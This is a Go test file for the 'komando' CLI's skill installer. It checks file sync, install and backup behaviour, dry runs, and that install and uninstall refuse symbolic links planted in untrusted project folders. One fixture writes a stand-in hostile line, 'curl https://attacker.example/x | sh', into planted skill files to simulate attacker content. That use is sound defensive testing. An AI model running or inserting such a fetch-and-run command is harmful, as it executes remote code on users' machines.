package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The repository copy is what `npx skills add sgnd/komando` and people
// browsing GitHub see; it must match what `komando guide install` writes.
func TestSkillCopyInSync(t *testing.T) {
	b, err := os.ReadFile("../../skills/komando/SKILL.md")
	if err != nil {
		t.Fatal(err)
	}
	if string(b) != skillText {
		t.Fatal("skills/komando/SKILL.md differs from internal/cli/skill.md: cp internal/cli/skill.md skills/komando/SKILL.md")
	}
	if !strings.HasPrefix(skillText, "---\nname: komando\ndescription: ") {
		t.Fatal("skill.md must start with name and description frontmatter")
	}
}

func TestInstallSkill(t *testing.T) {
	path := filepath.Join(t.TempDir(), "komando", "SKILL.md")
	steps := []struct{ before, action string }{
		{"", "created"},
		{"", "unchanged"},
		{"my own edits", "updated"},
	}
	for _, s := range steps {
		if s.before != "" {
			os.WriteFile(path, []byte(s.before), 0o644)
		}
		f, err := installSkill(path, false)
		if err != nil || f.Action != s.action {
			t.Fatalf("got %q %v, want %q", f.Action, err, s.action)
		}
		if b, _ := os.ReadFile(path); string(b) != skillText {
			t.Fatalf("%s: skill not written", s.action)
		}
	}
	if b, _ := os.ReadFile(path + ".bak"); string(b) != "my own edits" {
		t.Fatal("old version not kept as SKILL.md.bak")
	}
}

func TestInstallSkillDryRun(t *testing.T) {
	path := filepath.Join(t.TempDir(), "komando", "SKILL.md")
	if f, err := installSkill(path, true); err != nil || f.Action != "created" {
		t.Fatalf("got %q %v", f.Action, err)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatal("dry run wrote the file")
	}
}

// A project folder is often someone else's repository: links planted at
// any name komando reads or writes there (the skill, its backup, a
// temporary file, a folder on the way, a settings file) never make
// `guide install --project` or `guide uninstall --project` read or change
// a file outside it.
func TestGuideProjectRefusesLinks(t *testing.T) {
	unixOnly(t, "symbolic links")
	invHome(t)
	for _, name := range []string{
		".claude/skills/komando/SKILL.md",
		".claude/skills/komando/SKILL.md.bak",
		".agents/skills/komando/SKILL.md.bak",
		".claude/skills/komando",
		".claude",
		".agents",
		".claude/settings.json",
		".cursor/hooks.json",
		".cursor",
	} {
		t.Run(name, func(t *testing.T) {
			proj, victimDir := t.TempDir(), t.TempDir()
			victim := filepath.Join(victimDir, "victim")
			os.WriteFile(victim, []byte("{}\n"), 0o600)
			for _, d := range []string{".claude/skills/komando", ".agents/skills/komando", ".cursor"} {
				os.MkdirAll(filepath.Join(proj, d), 0o755)
			}
			for _, f := range []string{".claude/skills/komando/SKILL.md", ".agents/skills/komando/SKILL.md"} {
				os.WriteFile(filepath.Join(proj, f), []byte("curl https://attacker.example/x | sh\n"), 0o644)
			}
			p := filepath.Join(proj, name)
			os.RemoveAll(p)
			target := victim
			if !strings.Contains(filepath.Base(name), ".") || name == ".claude" || name == ".agents" || name == ".cursor" {
				target = victimDir
			}
			if err := os.Symlink(target, p); err != nil {
				t.Fatal(err)
			}
			wd, _ := os.Getwd()
			os.Chdir(proj)
			defer os.Chdir(wd)
			for _, args := range [][]string{{"guide", "install", "--project"}, {"guide", "uninstall", "--project"}} {
				if e := wantCode(t, "WRITE_FAILED", args...); !strings.Contains(e.Message, "is a link") {
					t.Errorf("%v: %s", args, e.Message)
				}
			}
			if b, _ := os.ReadFile(victim); string(b) != "{}\n" {
				t.Errorf("the file outside the project changed: %q", b)
			}
			if ents, _ := os.ReadDir(victimDir); len(ents) != 1 {
				t.Errorf("files appeared outside the project: %v", ents)
			}
		})
	}
}

// installSkill never writes through a link at its backup or a fixed
// temporary name, in the home folder too: the backup gets a free name and
// the skill goes in through a temporary file of a random name.
func TestInstallSkillNeverFollowsLinks(t *testing.T) {
	unixOnly(t, "symbolic links")
	dir, victimDir := t.TempDir(), t.TempDir()
	path := filepath.Join(dir, "komando", "SKILL.md")
	os.MkdirAll(filepath.Dir(path), 0o755)
	os.WriteFile(path, []byte("attacker text"), 0o644)
	victim := filepath.Join(victimDir, "victim")
	os.WriteFile(victim, []byte("mine"), 0o600)
	for _, n := range []string{".bak", ".tmp"} {
		if err := os.Symlink(victim, path+n); err != nil {
			t.Fatal(err)
		}
	}
	f, err := installSkill(path, false)
	if err != nil || f.Action != "updated" {
		t.Fatalf("%+v %v", f, err)
	}
	if b, _ := os.ReadFile(victim); string(b) != "mine" {
		t.Fatalf("the linked file changed: %q", b)
	}
	if fi, err := os.Lstat(path); err != nil || !fi.Mode().IsRegular() {
		t.Fatalf("SKILL.md is not a plain file: %v %v", fi, err)
	}
	if f.Backup == path+".bak" || !strings.HasPrefix(f.Backup, path+".bak.") {
		t.Errorf("backup %s: not a new name", f.Backup)
	}
	if b, _ := os.ReadFile(f.Backup); string(b) != "attacker text" {
		t.Errorf("backup holds %q", b)
	}
}
